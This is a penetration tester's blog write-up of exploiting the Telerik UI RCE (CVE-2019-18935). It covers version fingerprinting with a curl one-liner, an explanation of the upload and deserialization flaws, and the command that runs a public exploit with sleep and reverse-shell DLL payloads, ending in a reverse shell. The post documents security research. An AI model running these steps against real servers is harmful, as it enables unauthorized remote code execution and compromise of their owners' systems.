---
layout:     post
author:     0x5c4r3
image: /img/Telerik_RCE/twitter_banner_telerik.jpeg
type: blog
---
# <span style="color:red;font-size:17px;"><ins><b>\\\findings: Telerik RCE (CVE-2019-18935)</b></ins></span>

&nbsp;

<ins style="color:red;">Enumeration & Detection</ins>

&nbsp;

I was recently working on a pentest for a really big company, huge scope, quite a lot of different IPs and hosts from all over the world. Focusing on one IP, I was checking the various endpoints of its web servers and while scanning and enumerating the website to have a general map of the structure, I was checking the source code of a page and I noticed some references to Telerik, a famous collection of UI tools for web applications. The webpage also contained an html comment that might have been the version implemented:

&nbsp;

<img src="/img/Telerik_RCE/detection_telerik.png" style="width:80%;height:80%;display:block;margin-left:auto;margin-right:auto;" alt="Burp_Detection">

&nbsp;

The pic clearly showed that _default.aspx_ had something to deal with Telerik, so I checked the HTTP History and I found the actual endopoint:

&nbsp;

<img src="/img/Telerik_RCE/detection2.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="Burp_Detection">

&nbsp;

Ok, at this point I was sure Telerik was actually implemented, but I was not that sure about the version - I could't only rely on an html comment - so I researched online and I found out that you can figure out the version implemented running the following very simple bash script against different endpoints: 
```shell
curl -skL <HOST> | grep -oE '20[0-9]{2}(\.[0-9]*)+'
```
I ended up running it against 3 different endpoints related to Telerik that reported the same version: v2017.1.228.45.

&nbsp;

<ins style="color:red;">Exploitation - Quick Theory</ins>

&nbsp;
  
I was already aware about <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18935" style="color:red;">CVE-2019-18935</a>, but I didn't have the possibility to dig in details.<br/>
The vulnerability is based on 2 parts: an Unrestricted File Upload and an Insecure Deserialization.

&nbsp;

CVE-2017-11317:  _RadAsyncUpload_, a file handler that allows asynchronous encrypted file uploads. Until v2017.2.621, the encryption mechanism implemented was not secure, allowing an attacker to use a hard-coded key to craft a file upload request to _/Telerik.Web.Ui.WebResource.axd?type=rau_ with a custom encrypted rauPostData POST parameter. Changing the _TempTargetFolder_, an attacker is able to save the uploaded file to any directory the web server has write acess to.
 
&nbsp;
  
CVE-2019-18935: _rauPostData_ contains the serialize configuration and the type of the object, which gets deserialized by the .NET's _JavaScriptSerializer.Deserialize()_ function. When the deserialization happens, this function takes some parameters and assign them based on the specified object-type specified. If the type of the object can be controlled by the attacker, he/she may specify it to be a _gadget_ (a class that, if instantiated and modified via "assignment" functions, might be useful during deserialization because of certain properties). Basically, an attacker can upload a file through a POST request specifying the type as an RCE gadget - uploaded as mixed mode assemlbly DLL file - using the unrestricted file upload vulnerability  mentioned above, following up with a second request to trigger JavaScriptSerializer to deserialize an object of type <a style="color:red;" href="https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller?view=netframework-4.8" target="_blank" rel="noreferrer noopener">System.Configuration.Install.AssemblyInstaller</a>. At the time of deserialization, the application will load the DLL and, as long as the payload (DLL) has been compiled for the right architecture, its DDLMain() function will be called, running its code.
  
&nbsp;

<ins style="color:red;">Exploitation - The Fun Part</ins>

&nbsp;

Yeah the theory it's boring, I know, so let's dive in the actual exploit. First thing first, the CVE comes in <a style="color:red;" href="https://github.com/noperator/CVE-2019-18935" style="color:red;">Github</a>, very well explained. It's not immediate tho, so I'll try to explain what I have done as best as I can.<br/>
Since the exploitation of the vulnerability depends on the architecture of the vulnerable server, I had to go through a little trial and error to get the correct one, since I had no idea of what the server structure was. <br/>
Also, the exploit comes with different payloads, one of which is the _sleep.c_, which force the server to wait 10 seconds before replying to the request. Using this, we can easily see if it's actually vulnerable.<br/>
I used a Windows 11 VM with Visual Studio and .NET Framework SDK installed (both mandatory to have the compilation works) and I compiled the sleep.c payload using the _build-dll.bat_ as shown in the picture below:

&nbsp;

<img src="/img/Telerik_RCE/payload.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">

&nbsp;
  
and I ended up with two different payloads, _sleep-XXXXXXXXXXXXX-amd64.dll_ and _sleep-XXXXXXXXXXXXX-x86.dll_, for both x86 and x64 architectures. Since nowadays the majority of the computers run x64 architectures, I decided to move the amd64 sleep payload to my kali machine with a simple and quick python server and I run the exploit sending the payload as follows:
  
 &nbsp; 
  
```shell
python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
```
  
&nbsp;
  
The exploit actually works, with the execution time of the script over 10 seconds:
  
&nbsp;
  
<img src="/img/Telerik_RCE/10sec.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">
  
&nbsp;
 
At this point I just compiled the _reverse_shell.c_ payload in Win11 and following the same path of the sleep.dll, I sent it to the server, receiving a reverse shell.
  
&nbsp;
  
<img src="/img/Telerik_RCE/revshell.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">
 
